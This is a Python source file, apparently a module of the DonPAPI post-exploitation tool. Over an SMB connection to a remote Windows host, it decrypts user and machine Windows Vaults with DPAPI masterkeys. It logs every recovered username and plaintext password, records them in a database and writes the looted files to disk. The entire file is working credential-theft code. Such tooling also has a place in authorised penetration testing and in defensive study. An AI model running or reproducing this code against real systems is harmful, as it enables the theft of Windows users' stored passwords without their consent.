from typing import Any
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.utils import dump_looted_files_to_disk
from dploot.triage.vaults import VaultsTriage
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter


class Vaults:
    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore, false_positive: list, max_filesize: int) -> None:
        self.tag = self.__class__.__name__
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context
        self.false_positive = false_positive
        self.max_filesize = max_filesize

    def run(self):
        self.logger.display(f"Dumping User{' and Machine' if self.context.remoteops_allowed else ''} Vaults")

        def vaults_callback(vault):
            if vault.type == "Internet Explorer":
                resource = vault.resource + " -" if vault.resource != "" else "-"
                self.logger.secret(f"[{vault.winuser}] {resource} - {vault.username}:{vault.password}", vault.type.upper())
                self.context.db.add_secret(
                    computer=self.context.host,
                    collector=self.tag,
                    windows_user=vault.winuser,
                    username=vault.username,
                    password=vault.password,
                    program=vault.type,
                    target=vault.resource,
                )
            else:
                self.logger.secret(f"[{vault.winuser}] {vault.resource} {vault.username}:{vault.password}", self.tag)
                self.context.db.add_secret(
                    computer=self.context.host,
                    collector=self.tag,
                    windows_user=vault.winuser,
                    username=vault.username,
                    password=vault.password,
                    program=vault.type,
                    target=vault.resource
                )

        vaults_triage = VaultsTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys)
        vaults_triage.triage_vaults()
        if self.context.remoteops_allowed:
            vaults_triage.triage_system_vaults()

        dump_looted_files_to_disk(self.context.target_output_dir, vaults_triage.looted_files)
            